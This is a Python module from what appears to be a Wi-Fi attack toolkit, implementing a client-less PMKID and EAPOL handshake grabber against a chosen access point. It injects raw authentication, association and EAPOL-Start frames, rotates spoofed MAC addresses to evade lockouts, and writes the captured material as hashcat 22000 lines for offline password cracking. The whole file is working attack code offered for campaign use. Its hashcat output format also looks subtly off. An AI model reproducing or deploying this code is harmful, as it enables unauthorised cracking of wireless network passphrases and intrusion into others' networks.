# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Native PMKID + EAPOL M1-M2 grabber — replaces hcxdumptool for the
targeted, single-AP use case wifipilot actually needs during campaigns.

The classic client-less PMKID attack (atom/steube, 2018) works because an AP
authenticating a new association sends EAPOL M1 with the PMKID = HMAC-SHA1-128
of the PMK over "PMK Name" || MAC_AP || MAC_STA. We simply:

1. Lock to the AP's channel.
2. Transmit Auth → Assoc-Req (with RSN IE) from a random source MAC.
3. Listen for the AP's EAPOL M1. If it contains a PMKID KDE (tag 0xdd
   OUI 00-0f-ac type 04), we have a client-less hash; if it contains no
   PMKID but the AP sends M1 and waits for M2, we can hold the frame and
   write hashcat 22000-format for EAPOL when we also see M2 (full handshake).
4. For full handshakes we also transmit EAPOL-Start after association to
   encourage an M1.

This module does not attempt the broader "PMKID from any AP on the band"
sweep hcxdumptool does — that is much louder and rarely needed for the
targeted campaign workflow, and the existing ``hcxdump_capture`` attack still
dispatches to hcxdumptool if it is installed. This native path runs even when
no external tools are present.
"""
from __future__ import annotations

import random
import socket
import threading
import time
from dataclasses import dataclass
from typing import Optional

from . import ieee80211, radiotap
from .sniff import Sniffer, SniffedEapol
from ..util import mac_norm

# KDE types for PMKID in EAPOL key data
_PMKID_KDE_OUI_TYPE = b"\x00\x0f\xac\x04"   # OUI 00-0f-ac, data-type 4 (PMKID)

def random_mac() -> str:
    """Locally-administered unicast MAC."""
    b = [random.randint(0x00, 0xff) for _ in range(6)]
    b[0] = (b[0] & 0xfe) | 0x02  # locally administered, unicast
    return ":".join(f"{x:02x}" for x in b)

def extract_pmkid(key_data: bytes) -> Optional[bytes]:
    """Look for the PMKID KDE in EAPOL M1 key-data. Returns 16 bytes or None."""
    i = 0
    while i + 4 <= len(key_data):
        t = key_data[i]
        ln = key_data[i+1]
        i += 2
        if i + ln > len(key_data):
            return None
        if t == 221 and ln >= 6 and key_data[i:i+4] == _PMKID_KDE_OUI_TYPE:
            # KDE format: OUI+type(4 bytes) + PMKID (16 bytes)
            if ln >= 20:
                return key_data[i+4:i+20]
            return None
        i += ln
    return None


@dataclass
class PmkidResult:
    bssid: str
    ap_mac: bytes
    sta_mac: bytes
    ssid: str
    pmkid: bytes = b""
    anonce: bytes = b""
    m1_frame: bytes = b""
    m2_frame: bytes = b""
    got_pmkid: bool = False
    got_handshake: bool = False


class PmkidGrabber:
    """Single-AP PMKID + M1/M2 grabber."""
    def __init__(self, interface: str, bssid: str, ssid: str, channel: int,
                 timeout: float = 20.0, interval: float = 0.2,
                 sta_mac: Optional[str] = None):
        self.interface = interface
        self.bssid = mac_norm(bssid)
        self.ssid = ssid
        self.channel = channel
        self.timeout = timeout
        self.interval = interval
        self.sta_mac = mac_norm(sta_mac) if sta_mac else random_mac()
        self.result = PmkidResult(bssid=self.bssid,
                                  ap_mac=ieee80211.mac_to_bytes(self.bssid),
                                  sta_mac=ieee80211.mac_to_bytes(self.sta_mac),
                                  ssid=ssid)
        self._sock: Optional[socket.socket] = None
        self._stop = threading.Event()
        self._sniffer: Optional[Sniffer] = None
        self._send_thread: Optional[threading.Thread] = None
        self._seq = 1

    # ------------------------------------------------------------------ #
    def _open(self) -> bool:
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.bind((self.interface, 0))
            self._sock = s
            return True
        except OSError:
            return False

    def _send(self, frame: bytes, rate: float = 2.0) -> None:
        if not self._sock:
            return
        out = radiotap.with_header(frame, rate_mbps=rate, channel=self.channel)
        try:
            self._sock.send(out)
            self._seq += 1
        except OSError:
            pass

    # ------------------------------------------------------------------ #
    def run(self) -> PmkidResult:
        from .scanner import set_channel
        set_channel(self.interface, self.channel)
        if not self._open():
            return self.result

        snif = Sniffer(self.interface, bssid=self.bssid,
                       on_eapol=self._on_eapol, stop_event=self._stop)
        if not snif.open():
            return self.result
        self._sniffer = snif
        snif.start()

        # Send thread: every interval poke the AP with Auth+Assoc+EAPOL-Start
        self._send_thread = threading.Thread(target=self._send_loop, daemon=True)
        self._send_thread.start()

        # wait for result or timeout
        start = time.time()
        while time.time() - start < self.timeout:
            if self.result.got_pmkid:
                break
            if self.result.got_handshake:
                # Give one more second for PMKID if M1 is in but PMKID KDE not seen.
                time.sleep(0.5)
                if self.result.got_pmkid:
                    break
            time.sleep(0.1)
        self._stop.set()
        snif.close()
        if self._sock:
            with contextlib.suppress(Exception):
                self._sock.close()
        return self.result

    def _send_loop(self) -> None:
        bss = self.bssid; sta = self.sta_mac
        # rotate STA mac each few attempts to avoid lockouts
        attempts = 0
        while not self._stop.is_set():
            attempts += 1
            if attempts % 10 == 0:
                # refresh source MAC
                self.sta_mac = random_mac()
                self.result.sta_mac = ieee80211.mac_to_bytes(self.sta_mac)
                sta = self.sta_mac
            self._send(ieee80211.auth_open_req(bss, sta, seq=self._seq))
            time.sleep(0.05)
            self._send(ieee80211.assoc_request(bss, sta, self.ssid, seq=self._seq))
            time.sleep(0.05)
            # EAPOL-Start is a data frame ToDS from STA to BSSID
            self._send(_eapol_start_frame(sta, bss), rate=2.0)
            if self._stop.wait(self.interval):
                return

    # ------------------------------------------------------------------ #
    def _on_eapol(self, ev: SniffedEapol) -> None:
        # AP->STA frame (src==bssid) is M1/M3; STA->AP frame (dst==bssid) is M2/M4
        if mac_norm(ev.src) == self.bssid:
            # M1/M3
            if ev.info & ieee80211.KI_FLAGS_ACK and not (ev.info & ieee80211.KI_FLAGS_INSTALL):
                # M1
                pmkid = extract_pmkid(ev.key_data)
                if pmkid and pmkid != b"\x00"*16:
                    self.result.pmkid = pmkid
                    self.result.anonce = ev.nonce
                    self.result.m1_frame = ev.frame
                    self.result.got_pmkid = True
                    self._stop.set()
                    return
                # no PMKID KDE - still save M1 for full-handshake path
                if not self.result.m1_frame:
                    self.result.anonce = ev.nonce
                    self.result.m1_frame = ev.frame
        else:
            # STA->AP: M2 or M4. We don't send a real M2 (no MIC computed),
            # but if a real client associates while we're scanning we get
            # the handshake for free.
            if self.result.m1_frame and not self.result.m2_frame:
                self.result.m2_frame = ev.frame
                self.result.got_handshake = True


def _eapol_start_frame(sta: str, bssid: str) -> bytes:
    """ToDS data frame STA->BSSID carrying EAPOL-Start."""
    s = ieee80211.mac_to_bytes(sta)
    b = ieee80211.mac_to_bytes(bssid)
    fc = ieee80211.build_fc(ieee80211.TYPE_DATA, ieee80211.ST_DATA, to_ds=True)
    # addr1 = BSSID, addr2 = STA, addr3 = BSSID (DA in EAPOL is BSSID)
    hdr = ieee80211.data_header(fc, 0, b, s, b, seq=0)
    return hdr + ieee80211.LLC_SNAP_EAPOL + ieee80211.eapol_start(sta)


def pmkid_to_hashcat22000(mac_ap: bytes, mac_sta: bytes, pmkid: bytes,
                          ssid: str, anonce: bytes = b"\x00"*32) -> str:
    """Convert a PMKID capture into a single hashcat 22000 (line type 1)."""
    # signature: 22000 | PMKID | MAC_AP | MAC_STA | ESSID (max 32 bytes) | 00 | ANonce 0s
    # All hex. See hashcat 22000 spec v1.2:
    #   WPA*01*PMKID*MAC_AP*MAC_STA*ESSID*MESSAGEPAIR
    pmkid_h = pmkid.hex()
    ap_h = mac_ap.hex()
    sta_h = mac_sta.hex()
    essid_h = ssid.encode("utf-8").hex()
    m12 = "00"*32  # anonce/snonce placeholder (we have anonce, but type 01 needs none)
    return f"WPA*01*{pmkid_h}*{ap_h}*{sta_h}*{essid_h}*{m12}"


import contextlib
